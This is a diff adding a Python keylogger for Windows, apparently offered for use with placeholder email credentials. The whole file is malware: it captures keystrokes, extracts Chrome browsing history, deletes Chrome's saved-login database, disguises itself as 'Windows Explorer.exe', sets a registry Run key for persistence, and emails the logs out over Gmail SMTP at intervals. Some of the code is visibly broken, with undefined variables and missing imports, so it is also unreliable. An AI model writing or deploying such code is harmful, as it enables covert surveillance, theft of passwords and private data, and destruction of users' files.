@@ -1,0 +1,169 @@
+from pynput.keyboard import Key, Listener
+from pynput import keyboard
+import os
+import getpass
+import smtplib
+import threading
+import shutil
+import subprocess
+import sqlite3
+import sys
+import wmi
+import pythoncom
+
+
+def get_username():
+	return getpass.getuser()
+
+def chrome_location(file):
+	username = get_username()
+	chrome_loc = r"C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\{}".format(username, file)
+
+	if os.path.exists(chrome_loc):
+		return chrome_loc
+	return None
+
+def delete_data():
+	login_data = chrome_location("Login Data")
+
+	if login_data:
+		os.remove(login_data)
+		return True
+	return False
+
+def check_chrome_running():
+	pythoncom.CoInitialize()
+	check = wmi.WMI()
+	for process in check.Win32_Process():
+		if process.Name == "chrome.exe":
+			return True
+	return False
+
+class Chrome:
+	def __init__(self):
+		pass
+
+	def database_connection(self, data_base, select_from, time=None, *args):
+		conn = sqlite3.connect(database)
+		c = conn.cursor()
+
+		try:
+			if time:
+				c.execute("SELECT datetime({}/1000000, 'unixepoch'), {} FROM {}".format(time, ", ".join(args), select_from))
+			else:
+				c.execute("SELECT {} FROM {}".format(", ".join(args), select_from))
+		except sqlite3.OperationalError as e:
+			print(e)
+		result = c.fetchall()
+		c.close()
+		return result
+
+	def get_file_name(self):
+		username = get_username()
+		return f"C:/Users/{username}/Documents/data.txt"
+
+	def write_dict_to_file(self, dict_obj):
+		username = get_username()
+
+		with open(self.get_file_name(), "a") as f:
+			for key, value in dict_obj.items():
+				write = f"[*] Url: {key} : {value}\n"
+				f.write(write)
+		return self.get_file_name()
+
+	def chrome_history(self):
+		history = chrome_location("History")
+
+		if history:
+			urls = self.database_connection(history, "urls", "last_visit_time", "url")
+			my_dict = {}
+
+			for url in urls:
+				if "http://" in url[1]:
+					result = url[1].split("http://")[1].replace("/", "")
+				else:
+					result = url[1].split("https://")[1].replace("/", "")
+
+				if not result in my_dict:
+					my_dict[url[0]] = result
+			return self.write_dict_to_file(my_dict)
+		return None
+
+class Keylogger(Chrome):
+	def __init__(self, email, password, email_to=None, interval=5):
+		super().__init__()
+		self.log = ""
+		self.email = email
+		self.password = password
+		self.email_to = email_to
+		self.interval = interval * 60
+
+	def persistence(self):
+		location = os.environ["appdata"] + "\\Windows Explorer.exe"
+		if not os.path.exists(location):
+			shutil.copyfile(sys.executable, location)
+			subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{}"'.format(location), shell=True)
+
+	def report_url_file(self):
+		FILE_NAME = self.chrome_history()
+
+		if FILE_NAME:
+			message = MIMEMultipart()
+			message.attach(MIMEText(open(FILE_NAME).read()))
+			message = str(message)
+			self.send_email(message)
+			os.remove(FILE_NAME)
+
+	def send_email(self, message):
+		server = smtplib.SMTP('smtp.gmail.com', 587)
+		server.ehlo()
+		server.starttls()
+		valid = False
+
+		try:
+			server.login(self.email, self.password)
+			valid = True
+		except smtplib.SMTPAuthenticationError:
+			pass
+
+		if valid:
+			if email_to:
+				server.sendmail(self.email, self.email_to, message)
+			else:
+				server.sendmail(self.email, self.email, message)
+		return
+
+	def on_press(self, key):
+		try:
+			self.log += str(key.char)
+		except AttributeError:
+			self.log += " "
+
+	def tidy_log(self, log):
+		log = log.split()
+
+		if not log:
+			log = "[!] User did not type anything"
+
+		if isinstance(log, list):
+			log = " ".join(log)
+		return log
+
+	def report_logs(self):
+		if not check_chrome_running():
+			self.report_url_file()
+
+		self.send_email(self.tidy_log(self.log))
+		self.log = ""
+		threading.Timer(self.interval, self.report_logs).start()
+
+	def start_keylog(self):
+		listener = Listener(on_press=self.on_press)
+		self.report_logs()
+		listener.start()
+
+if __name__ == '__main__':
+	key = Keylogger(None, password=None, interval=None) # Replace the None values here. Email, password, interval
+	key.persistence()
+	delete_data()
+	key.report_logs()
